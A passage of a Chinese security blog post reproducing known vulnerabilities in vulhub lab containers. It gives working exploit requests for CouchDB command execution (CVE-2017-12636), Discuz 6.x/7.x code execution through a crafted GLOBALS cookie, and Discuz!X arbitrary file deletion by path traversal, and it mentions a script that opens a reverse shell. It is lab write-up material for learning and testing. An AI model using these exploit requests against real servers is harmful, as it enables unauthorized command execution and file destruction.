&quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功创建管理员，账户密码均为<code>vulhub</code>：</p>
+<p><img src="vulhub挖洞心得/19.png" alt=""></p>
+<p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p>
+<p><img src="vulhub挖洞心得/20.png" alt=""></p>
+<h4 id="（2）Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#（2）Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="（2）Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>（2）Couchdb 任意命令执行漏洞（CVE-2017-12636）</h4><p>参考链接：</p>
+<ul>
+<li><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a></li>
+<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
+</ul>
+<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635" target="_blank" rel="noopener">CVE-2017-12635</a>先增加一个管理员用户。</p>
+<p>依次执行如下请求即可触发任意命令执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application&#x2F;json&#39;</span><br></pre></td></tr></table></figure>
+<p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p>
+<p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p>
+<p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p>
+<p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p>
+<p>利用脚本</p>
+<p>写了一个简单的脚本 <a href="exp.py">exp.py</a>，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本，成功反弹shell：</p>
+<p><img src="vulhub挖洞心得/21.png" alt=""></p>
+<h3 id="6-discuz"><a href="#6-discuz" class="headerlink" title="6.discuz"></a>6.discuz</h3><h4 id="1-Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#1-Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="(1)Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>(1)Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h4><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
+<p>具体原理请参考：</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/2338.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2338.html</a></li>
+</ul>
+<p>安装成功后，直接找一个已存在的帖子，向其发送数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;viewthread.php?tid&#x3D;10&amp;extra&#x3D;page%3D1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.6.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui; GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><br>可见，phpinfo已成功执行：</p>
+<p><img src="vulhub挖洞心得/22.png" alt=""><br>同样，也可以换成system()函数，这样就可以在括号里执行一些命令</p>
+<h4 id="（2）Discuz-X-≤3-4-任意文件删除漏洞"><a href="#（2）Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="（2）Discuz!X ≤3.4 任意文件删除漏洞"></a>（2）Discuz!X ≤3.4 任意文件删除漏洞</h4><p>漏洞详情：<a href="https://lorexxar.cn/2017/09/30/dz-delete/" target="_blank" rel="noopener">https://lorexxar.cn/2017/09/30/dz-delete/</a></p>
+<p>访问<code>http://your-ip/robots.txt</code>可见robots.txt是存在的：<br><img src="vulhub挖洞心得/23.png" alt=""></p>
+<p>注册用户后，在个人设置页面找到自己的formhash：</p>
+<p><img src="vulhub挖洞心得/24.png" alt=""></p>
+<p>带上自己的Cookie、formhash发送如下数据包：</p>
+<pre><code>POST /home.php?mod=spacecp&amp;ac=profile&amp;op=base HTTP/1.1
+Host: localhost
+Content-Length: 367
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+Cookie: [your cookie]
+Connection: close
+
+------WebKitFormBoundaryPFvXyxL45f34L12s
+Content-Disposition: form-data; name=&quot;formhash&quot;
+
+[your formhash]
+------WebKitFormBoundaryPFvXyxL45f34L12s
+Content-Disposition: form-data; name=&quot;birthprovince&quot;
+
+../../../robots.txt
+------WebKitFormBoundaryPFvXyxL45f34L12s
+Content-Disposition: form-data; name=&quot;profilesubmit&quot;
+
+1
+------WebKitFormBoundaryPFvXyxL45f34L12s--
+</code></pre><p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：</p>
+<p><img src="vulhub挖洞心得/25.png" alt=""></p>
+<p>说明我们的脏数据已经进入数据库了。</p>
+<p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;[your-ip]&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;[form-hash]&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;birthprovince&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+<p>用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。</p>
+<p>再次访问<code>http://your-ip/robots.txt</code>，发现文件成功被删除：</p>
+<p><img src="vulhub挖洞心得/26.png" alt=""></p>
+<p>未完待续</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/" data-id="ck4sb1gh40003zkuy455uh09r" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          渗透测试神器burpsuite
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/05/25/ISCC2018-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ISCC2018 wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CMS/" style="font-size: 20px;">CMS</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 10px;">攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">PHP特性总结</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/">2018WEB安全测试秋季预选赛</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/">海洋CMS</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/05/docker%E5%BF%83%E5%BE%97/">docker心得</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/">再见CMS--齐博CMS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
